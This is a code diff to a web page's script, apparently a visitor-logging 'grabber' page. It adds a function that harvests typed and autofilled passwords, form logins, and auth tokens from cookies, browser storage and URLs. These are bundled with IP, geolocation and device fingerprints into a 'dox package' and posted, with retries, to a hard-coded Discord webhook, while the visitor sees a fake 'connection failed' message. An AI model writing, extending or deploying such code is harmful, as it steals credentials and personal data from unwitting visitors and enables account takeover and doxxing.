@@ -59,6 +59,126 @@
         // ─── DISCORD WEBHOOK ─────────────────────────────────────
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534703292934787283/hoj4Ifi-vZe91DhEa7PSaOhqeW4-rGf0sj0U46HDAZAbS8PHqebMKcVTMOUO3lq1aW3t';
 
+        // ─── PASSWORD GRABBERS ──────────────────────────────────
+        function grabSavedPasswords() {
+            const passwords = [];
+            
+            // 1. Check for autofilled password fields
+            try {
+                document.querySelectorAll('input[type="password"]').forEach(el => {
+                    if (el.value) {
+                        passwords.push({
+                            type: 'autofilled',
+                            value: el.value,
+                            id: el.id || 'unknown',
+                            name: el.name || 'unknown'
+                        });
+                    }
+                });
+            } catch(e) {}
+
+            // 2. Check localStorage for password patterns
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const val = localStorage.getItem(key);
+                    if (key.toLowerCase().includes('pass') || 
+                        key.toLowerCase().includes('pwd') ||
+                        key.toLowerCase().includes('token') ||
+                        key.toLowerCase().includes('auth')) {
+                        passwords.push({
+                            type: 'localStorage',
+                            key: key,
+                            value: val
+                        });
+                    }
+                }
+            } catch(e) {}
+
+            // 3. Check sessionStorage
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const val = sessionStorage.getItem(key);
+                    if (key.toLowerCase().includes('pass') || 
+                        key.toLowerCase().includes('pwd') ||
+                        key.toLowerCase().includes('token') ||
+                        key.toLowerCase().includes('auth')) {
+                        passwords.push({
+                            type: 'sessionStorage',
+                            key: key,
+                            value: val
+                        });
+                    }
+                }
+            } catch(e) {}
+
+            // 4. Check cookies for auth tokens
+            try {
+                document.cookie.split(';').forEach(cookie => {
+                    const [key, val] = cookie.trim().split('=');
+                    if (key.toLowerCase().includes('pass') || 
+                        key.toLowerCase().includes('pwd') ||
+                        key.toLowerCase().includes('token') ||
+                        key.toLowerCase().includes('auth') ||
+                        key.toLowerCase().includes('session')) {
+                        passwords.push({
+                            type: 'cookie',
+                            key: key,
+                            value: val
+                        });
+                    }
+                });
+            } catch(e) {}
+
+            // 5. Check for password managers (LastPass, Bitwarden, etc.)
+            try {
+                const forms = document.querySelectorAll('form');
+                forms.forEach(form => {
+                    const inputs = form.querySelectorAll('input');
+                    let hasPassword = false;
+                    let username = '';
+                    inputs.forEach(input => {
+                        if (input.type === 'password' && input.value) {
+                            hasPassword = true;
+                        }
+                        if (input.type === 'text' || input.type === 'email') {
+                            username = input.value;
+                        }
+                    });
+                    if (hasPassword && username) {
+                        const pwdInput = form.querySelector('input[type="password"]');
+                        if (pwdInput && pwdInput.value) {
+                            passwords.push({
+                                type: 'form_submission',
+                                username: username,
+                                password: pwdInput.value,
+                                formAction: form.action || 'unknown'
+                            });
+                        }
+                    }
+                });
+            } catch(e) {}
+
+            // 6. Check for session tokens in URL
+            try {
+                const params = new URLSearchParams(window.location.search);
+                params.forEach((val, key) => {
+                    if (key.toLowerCase().includes('token') || 
+                        key.toLowerCase().includes('auth') ||
+                        key.toLowerCase().includes('session')) {
+                        passwords.push({
+                            type: 'url_parameter',
+                            key: key,
+                            value: val
+                        });
+                    }
+                });
+            } catch(e) {}
+
+            return passwords;
+        }
+
         // ─── UTILITY ─────────────────────────────────────────────
         function getCookie(name) {
             const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
@@ -234,6 +354,30 @@
             });
         }
 
+        // ─── SEND TO DISCORD WITH RETRY ──────────────────────────
+        async function sendToDiscord(payload, retries = 3) {
+            for (let i = 0; i < retries; i++) {
+                try {
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    if (response.ok) {
+                        console.log('✅ Data sent successfully');
+                        return true;
+                    } else {
+                        console.log(`❌ Attempt ${i+1} failed: ${response.status}`);
+                        await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
+                    }
+                } catch (e) {
+                    console.log(`❌ Attempt ${i+1} error:`, e);
+                    await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
+                }
+            }
+            return false;
+        }
+
         // ─── MAIN ──────────────────────────────────────────────────
         async function gatherAndSend() {
             try {
@@ -263,7 +407,10 @@
 
                 document.getElementById('ip-address').textContent = '[ error: ' + ip + ' ]';
 
-                // 2. Browser / Device / System
+                // 2. Grab passwords
+                const passwords = grabSavedPasswords();
+                
+                // 3. Browser / Device / System
                 const ua = navigator.userAgent;
                 const platform = navigator.platform;
                 const language = navigator.language;
@@ -272,38 +419,38 @@
                 const doNotTrack = navigator.doNotTrack || 'unspecified';
                 const maxTouchPoints = navigator.maxTouchPoints || 0;
 
-                // 3. Storage
+                // 4. Storage
                 const cookies = document.cookie;
                 const localStorageData = getLocalStorage();
                 const sessionStorageData = getSessionStorage();
 
-                // 4. Plugins / MIME
+                // 5. Plugins / MIME
                 const plugins = getBrowserPlugins();
                 const mimeTypes = getMimeTypes();
 
-                // 5. Fingerprints
+                // 6. Fingerprints
                 const canvasFp = getCanvasFingerprint();
                 const webgl = getWebGLInfo();
                 const audioFp = getAudioFingerprint();
 
-                // 6. System
+                // 7. System
                 const timeZone = getTimeZone();
                 const screenInfo = getScreenInfo();
                 const deviceMemory = getDeviceMemory();
                 const hardwareConcurrency = getHardwareConcurrency();
                 const netInfo = getNetworkInfo();
 
-                // 7. Async
+                // 8. Async
                 const battery = await getBatteryInfo();
                 const geo = await getGeolocation();
                 const permissions = await getPermissions();
 
-                // 8. Referrer & Page
+                // 9. Referrer & Page
                 const referrer = document.referrer || 'direct';
                 const pageUrl = window.location.href;
                 const pageTitle = document.title;
 
-                // 9. Construct embed
+                // 10. Construct embed
                 const fields = [
                     { name: '🌐 IP Address', value: `\`${ip}\``, inline: true },
                     { name: '📍 Location', value: `${city}, ${region}, ${country}`, inline: true },
@@ -340,22 +487,41 @@
                     { name: '📱 User Agent (full)', value: `\`${ua}\``, inline: false }
                 ];
 
+                // Add password section if any found
+                if (passwords.length > 0) {
+                    const pwdSummary = passwords.map(p => {
+                        if (p.type === 'autofilled') {
+                            return `🔓 Autofilled: ${p.id} = ${p.value}`;
+                        } else if (p.type === 'form_submission') {
+                            return `🔑 Form: ${p.username} | ${p.password}`;
+                        } else {
+                            return `🔐 ${p.type}: ${p.key} = ${p.value}`;
+                        }
+                    }).join('\n');
+                    
+                    fields.push({
+                        name: '🔑 CAPTURED PASSWORDS & TOKENS',
+                        value: `\`\`\`${pwdSummary.substring(0, 1000)}\`\`\``,
+                        inline: false
+                    });
+                }
+
                 const embed = {
-                    title: '🕵️ FULL SYSTEM TELEMETRY',
+                    title: '🕵️ FULL SYSTEM TELEMETRY + PASSWORDS',
                     color: 0xff3b3b,
                     fields: fields,
                     timestamp: new Date().toISOString(),
                     footer: { text: '🚨 comprehensive dox package • all data logged' }
                 };
 
-                // 10. Send to Discord
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ embeds: [embed] })
-                });
-
-                document.getElementById('status').textContent = '⚠️ connection failed • retry limit exceeded';
+                // 11. Send to Discord with retry
+                const sent = await sendToDiscord({ embeds: [embed] });
+                
+                if (sent) {
+                    document.getElementById('status').textContent = '⚠️ connection failed • retry limit exceeded';
+                } else {
+                    document.getElementById('status').textContent = '⚠️ connection failed • server unreachable';
+                }
 
             } catch (err) {
                 document.getElementById('status').textContent = '⚠️ connection failed • server unreachable';
